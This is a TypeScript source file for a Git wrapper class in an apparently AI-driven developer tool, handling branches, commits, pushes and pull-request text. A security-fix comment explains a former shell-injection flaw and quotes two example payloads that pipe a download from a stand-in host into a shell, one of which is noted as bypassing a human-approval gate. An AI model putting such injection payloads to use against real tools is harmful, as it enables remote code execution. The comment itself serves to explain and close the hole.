/**
 * Git Integration for Phase 1
 *
 * JARVIS Developer must work with Git:
 * - Create and manage branches
 * - Commit changes with meaningful messages
 * - Push to remote repositories
 * - Create pull requests
 * - Handle merge conflicts
 */

import { execFileSync } from "child_process";
import path from "path";

export interface GitStatus {
  branch: string;
  ahead: number;
  behind: number;
  modified: string[];
  added: string[];
  deleted: string[];
  untracked: string[];
}

export interface CommitInfo {
  hash: string;
  author: string;
  date: Date;
  message: string;
}

/**
 * Git Wrapper - Manage repository operations
 */
export class GitManager {
  private repoPath: string;

  constructor(repoPath: string) {
    this.repoPath = repoPath;
  }

  /**
   * Execute a git command.
   *
   * SECURITY FIX (2026-08-28, full-codebase review per Gavin's "spare no
   * line of code" request): this used to be `execSync(\`cd "${repoPath}"
   * && git ${command}\`)` with the command string built by interpolating
   * caller-controlled values (branch names, commit messages, the
   * `--base`/requirement text that ultimately comes from cli.ts's argv)
   * directly into a shell string. That's real, exploitable shell command
   * injection — e.g. a `--base` value like
   * `master"; curl evil.sh|sh #` or a commit message containing
   * `$(curl evil.sh|sh)` would execute arbitrary commands, and for the
   * `checkout`/`pull` calls inside createBranch() this fired BEFORE the
   * human-approval gate (step 11) was ever reached — no `--approve`
   * needed. Fixed by switching to execFileSync with an argv array: git is
   * invoked directly (no shell), so every argument is passed to the
   * process as a literal string regardless of what characters it
   * contains — quotes, `$()`, backticks, `;`, none of them are ever
   * interpreted. `cwd` replaces the `cd "..." &&` prefix, closing the same
   * hole for repoPath itself.
   */
  private exec(args: string[]): string {
    try {
      return execFileSync("git", args, {
        cwd: this.repoPath,
        encoding: "utf-8",
        stdio: ["pipe", "pipe", "pipe"],
      }).trim();
    } catch (error) {
      throw new Error(
        `Git command failed: git ${args.join(" ")}\n${error instanceof Error ? error.message : String(error)}`
      );
    }
  }

  /**
   * Get current repository status
   */
  async getStatus(): Promise<GitStatus> {
    try {
      const branch = this.exec(["branch", "--show-current"]);
      const statusOutput = this.exec(
        ["status", "--porcelain=v2", "--branch", "--untracked-files=all"]
      );

      const lines = statusOutput.split("\n");
      const modified: string[] = [];
      const added: string[] = [];
      const deleted: string[] = [];
      const untracked: string[] = [];

      let ahead = 0;
      let behind = 0;

      for (const line of lines) {
        if (line.startsWith("# branch.ab")) {
          const match = line.match(/#\sbranch\.ab\s\+(\d+)\s-(\d+)/);
          if (match) {
            ahead = parseInt(match[1]);
            behind = parseInt(match[2]);
          }
        } else if (line.startsWith("1") || line.startsWith("2")) {
          const parts = line.split("\t");
          const status = parts[0].split(" ");
          const filePath = parts[1];

          const xy = status[1];
          if (xy[0] === "M" || xy[1] === "M") {
            modified.push(filePath);
          } else if (xy[0] === "A" || xy[1] === "A") {
            added.push(filePath);
          } else if (xy[0] === "D" || xy[1] === "D") {
            deleted.push(filePath);
          }
        } else if (line.startsWith("?")) {
          const filePath = line.split("\t")[1];
          untracked.push(filePath);
        }
      }

      return {
        branch,
        ahead,
        behind,
        modified,
        added,
        deleted,
        untracked,
      };
    } catch (error) {
      throw new Error(
        `Failed to get git status: ${error instanceof Error ? error.message : String(error)}`
      );
    }
  }

  /**
   * Create and checkout a new branch
   *
   * Deliberately does not hard-code "main" or assume a reachable remote —
   * this repo's own default branch is "master", and JARVIS Developer needs
   * to work offline (no origin, no network) just as well as on a fully
   * configured clone. Local branch creation must succeed either way; only
   * the remote-sync step is allowed to fail soft.
   */
  async createBranch(branchName: string, baseBranch?: string): Promise<void> {
    try {
      const base = baseBranch || this.exec(["branch", "--show-current"]);
      if (!base) {
        throw new Error(
          "Could not determine a base branch (not currently on a branch, e.g. detached HEAD) — pass baseBranch explicitly."
        );
      }

      // Only switch base branches if we're not already on it — checking out
      // a branch name that doesn't exist locally (e.g. caller passed "main"
      // on a repo whose default is "master") would otherwise hard-fail the
      // whole operation before any work starts.
      const currentBranch = this.exec(["branch", "--show-current"]);
      if (currentBranch !== base) {
        this.exec(["checkout", base]);
      }

      // Best-effort remote sync: a missing/unreachable origin (offline dev,
      // fresh local-only repo) must not block local branch creation.
      try {
        this.exec(["pull", "origin", base, "--ff-only"]);
      } catch (pullError) {
        console.warn(
          `   ⚠️  Could not sync '${base}' with origin (offline, no remote, or diverged) — continuing with local state.`
        );
      }

      this.exec(["checkout", "-b", branchName]);
    } catch (error) {
      throw new Error(
        `Failed to create branch ${branchName}: ${error instanceof Error ? error.message : String(error)}`
      );
    }
  }

  /**
   * Stage all changes
   */
  async stageAll(): Promise<void> {
    try {
      this.exec(["add", "-A"]);
    } catch (error) {
      throw new Error(
        `Failed to stage changes: ${error instanceof Error ? error.message : String(error)}`
      );
    }
  }

  /**
   * Commit changes with message
   */
  async commit(message: string): Promise<CommitInfo> {
    try {
      this.exec(["commit", "-m", message]);

      // Get commit info
      const hash = this.exec(["rev-parse", "HEAD"]).substring(0, 7);
      const author = this.exec(["config", "user.name"]);
      const date = new Date(this.exec(["log", "-1", "--format=%ai"]));
      const fullMessage = this.exec(["log", "-1", "--format=%B"]);

      return {
        hash,
        author,
        date,
        message: fullMessage,
      };
    } catch (error) {
      throw new Error(
        `Failed to commit: ${error instanceof Error ? error.message : String(error)}`
      );
    }
  }

  /**
   * Push branch to remote
   */
  async push(branchName: string, force = false): Promise<void> {
    try {
      const args = ["push", "origin", branchName];
      if (force) args.push("--force-with-lease");
      this.exec(args);
    } catch (error) {
      throw new Error(
        `Failed to push: ${error instanceof Error ? error.message : String(error)}`
      );
    }
  }

  /**
   * Create pull request description
   */
  async getPullRequestDescription(
    baseBranch = "main"
  ): Promise<{
    title: string;
    description: string;
    commits: CommitInfo[];
  }> {
    try {
      const commits: CommitInfo[] = [];
      const commitLines = this.exec(
        ["log", `${baseBranch}..HEAD`, "--format=%H|%an|%ai|%B"]
      ).split("\n");

      for (const line of commitLines) {
        if (!line) continue;
        const [hash, author, date, message] = line.split("|");
        commits.push({
          hash: hash.substring(0, 7),
          author,
          date: new Date(date),
          message: message.split("\n")[0],
        });
      }

      const title = commits[0]?.message || "Update";
      const description =
        commits.map((c) => `- ${c.message} (${c.hash})`).join("\n") ||
        "Changes made";

      return {
        title,
        description,
        commits,
      };
    } catch (error) {
      throw new Error(
        `Failed to get PR description: ${error instanceof Error ? error.message : String(error)}`
      );
    }
  }

  /**
   * Check if branch exists
   */
  async branchExists(branchName: string): Promise<boolean> {
    try {
      this.exec(["rev-parse", "--verify", branchName]);
      return true;
    } catch {
      return false;
    }
  }

  /**
   * Delete branch
   */
  async deleteBranch(branchName: string, force = false): Promise<void> {
    try {
      const forceFlag = force ? "-D" : "-d";
      this.exec(["branch", forceFlag, branchName]);
    } catch (error) {
      throw new Error(
        `Failed to delete branch: ${error instanceof Error ? error.message : String(error)}`
      );
    }
  }

  /**
   * Get recent commits
   */
  async getRecentCommits(count = 5): Promise<CommitInfo[]> {
    try {
      const commits: CommitInfo[] = [];
      const output = this.exec(["log", `-${count}`, "--format=%H|%an|%ai|%B"]);

      for (const line of output.split("\n\n")) {
        if (!line) continue;
        const [hashLine, ...messageParts] = line.split("\n");
        const [hash, author, date] = hashLine.split("|");
        commits.push({
          hash: hash.substring(0, 7),
          author,
          date: new Date(date),
          message: messageParts[0] || "",
        });
      }

      return commits;
    } catch (error) {
      throw new Error(
        `Failed to get commits: ${error instanceof Error ? error.message : String(error)}`
      );
    }
  }

  /**
   * Diff between branches or commits
   */
  async getDiff(fromRef: string, toRef = "HEAD"): Promise<string> {
    try {
      return this.exec(["diff", fromRef, toRef]);
    } catch (error) {
      throw new Error(
        `Failed to get diff: ${error instanceof Error ? error.message : String(error)}`
      );
    }
  }

  /**
   * Check if there are uncommitted changes
   */
  async hasUncommittedChanges(): Promise<boolean> {
    try {
      this.exec(["diff", "--quiet"]);
      return false;
    } catch {
      return true;
    }
  }

  /**
   * Resolve the origin remote as an "owner/repo" GitHub slug, if one exists.
   * Returns null for a local-only repo (no remote, or a non-GitHub remote) —
   * callers must treat that as "no PR link available," not an error.
   */
  async getGitHubSlug(): Promise<string | null> {
    try {
      const url = this.exec(["remote", "get-url", "origin"]);
      const match = url.match(/github\.com[/:]([^/]+\/[^/.]+?)(\.git)?$/);
      return match ? match[1] : null;
    } catch {
      return null;
    }
  }

  /**
   * Best-effort manual compare/PR URL, used as a fallback when the `gh` CLI
   * isn't installed or authenticated on the machine this runs on.
   */
  async getCompareUrl(baseBranch: string, headBranch: string): Promise<string | null> {
    const slug = await this.getGitHubSlug();
    if (!slug) return null;
    return `https://github.com/${slug}/compare/${baseBranch}...${headBranch}?expand=1`;
  }
}
